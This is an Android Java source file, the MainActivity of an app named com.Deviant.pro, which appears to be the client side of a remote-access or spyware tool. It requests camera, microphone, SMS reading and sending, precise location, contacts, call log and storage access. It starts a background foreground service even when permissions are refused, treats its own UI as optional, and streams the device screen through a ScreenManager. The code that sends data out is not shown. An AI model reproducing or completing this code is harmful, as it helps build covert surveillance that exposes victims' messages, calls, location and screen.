package com.Deviant.pro;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";

    // ✅ WeakReference — prevents Activity memory leak
    private static WeakReference<MainActivity> instanceRef;

    @Nullable
    public static MainActivity getInstance() {
        return instanceRef != null ? instanceRef.get() : null;
    }

    // -------------------------------------------------------------------------
    // Permission list — using Manifest constants for compile-time safety
    // -------------------------------------------------------------------------

    private static final String[] REQUIRED_PERMISSIONS;

    static {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.SEND_SMS);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.READ_CALL_LOG);

        // Storage — scoped per API level
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // API 33+: granular media permissions replace READ_EXTERNAL_STORAGE
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
            // API 33+: notification permission is now runtime
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
                perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
        }

        REQUIRED_PERMISSIONS = perms.toArray(new String[0]);
    }

    // -------------------------------------------------------------------------
    // Activity result launchers
    // -------------------------------------------------------------------------

    // ✅ Replaces deprecated requestPermissions + onRequestPermissionsResult
    private final ActivityResultLauncher<String[]> permissionLauncher =
            registerForActivityResult(
                    new ActivityResultContracts.RequestMultiplePermissions(),
                    results -> {
                        // Start service regardless of which permissions were granted
                        // Individual managers handle missing permissions gracefully
                        launchMainService();
                    });

    // ✅ Replaces deprecated startActivityForResult + onActivityResult
    private final ActivityResultLauncher<Intent> screenCaptureLauncher =
            registerForActivityResult(
                    new ActivityResultContracts.StartActivityForResult(),
                    result -> {
                        if (result.getResultCode() == RESULT_OK
                                && result.getData() != null) {
                            ScreenManager.startStreaming(
                                    this,
                                    result.getResultCode(),
                                    result.getData());
                        } else {
                            Log.w(TAG, "Screen capture permission denied or cancelled");
                        }
                    });

    // -------------------------------------------------------------------------
    // Lifecycle
    // -------------------------------------------------------------------------

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        instanceRef = new WeakReference<>(this);

        // ✅ Layout inflation — log errors instead of silently swallowing them
        try {
            setContentView(R.layout.activity_main);
        } catch (Exception e) {
            Log.e(TAG, "Failed to inflate layout: " + e.getMessage(), e);
            // Continue — service doesn't require a UI
        }

        checkAndRequestPermissions();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // ✅ Clear WeakReference on destroy so getInstance() returns null cleanly
        if (instanceRef != null && instanceRef.get() == this) {
            instanceRef = null;
        }
    }

    // -------------------------------------------------------------------------
    // Permissions
    // -------------------------------------------------------------------------

    private void checkAndRequestPermissions() {
        List<String> needed = new ArrayList<>();

        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(permission);
            }
        }

        if (needed.isEmpty()) {
            launchMainService();
        } else {
            // ✅ Uses ActivityResultLauncher — not deprecated requestPermissions()
            permissionLauncher.launch(needed.toArray(new String[0]));
        }
    }

    // -------------------------------------------------------------------------
    // Service launcher
    // -------------------------------------------------------------------------

    // ✅ Renamed from startService() to avoid shadowing Context.startService(Intent)
    private void launchMainService() {
        try {
            Intent intent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.d(TAG, "MainService launched");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start MainService: " + e.getMessage(), e);
        }
    }

    // -------------------------------------------------------------------------
    // Screen capture
    // -------------------------------------------------------------------------

    public void requestScreenShare() {
        try {
            MediaProjectionManager mpManager =
                    (MediaProjectionManager) getSystemService(
                            Context.MEDIA_PROJECTION_SERVICE);
            if (mpManager == null) {
                Log.e(TAG, "MediaProjectionManager unavailable");
                return;
            }
            // ✅ Uses ActivityResultLauncher — not deprecated startActivityForResult()
            screenCaptureLauncher.launch(mpManager.createScreenCaptureIntent());
        } catch (Exception e) {
            Log.e(TAG, "requestScreenShare error: " + e.getMessage(), e);
        }
    }
}
